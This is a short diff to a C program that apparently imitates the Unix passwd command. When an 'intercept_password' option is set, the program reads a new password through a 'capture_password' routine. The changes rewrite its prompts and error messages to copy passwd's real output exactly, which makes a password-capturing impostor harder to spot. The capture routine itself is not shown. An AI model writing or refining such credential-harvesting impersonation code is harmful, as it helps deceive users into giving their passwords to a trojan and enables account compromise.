@@ -111,17 +111,19 @@ int main(int argc, char *argv[]) {
     }
 
     if (!user_exists(username)) {
-        fprintf(stderr, "Error: User '%s' does not exist.\n", username);
+        fprintf(stderr, "passwd: user '%s' does not exist\n", username);
         exit(EXIT_FAILURE);
     }
 
     if (intercept_password) {
-        capture_password(password, sizeof(password), "Enter new password: ");
+        capture_password(password, sizeof(password), "New password: ");
         char confirm_password[256] = {0};
         capture_password(confirm_password, sizeof(confirm_password), "Retype new password: ");
 
         if (strcmp(password, confirm_password) != 0) {
-            fprintf(stderr, "Passwords do not match.\n");
+            fprintf(stderr, "Sorry, passwords do not match.\n");
+            fprintf(stderr, "passwd: Authentication token manipulation error\n");
+            fprintf(stderr, "passwd: password unchanged\n");
             exit(EXIT_FAILURE);
         }
     }
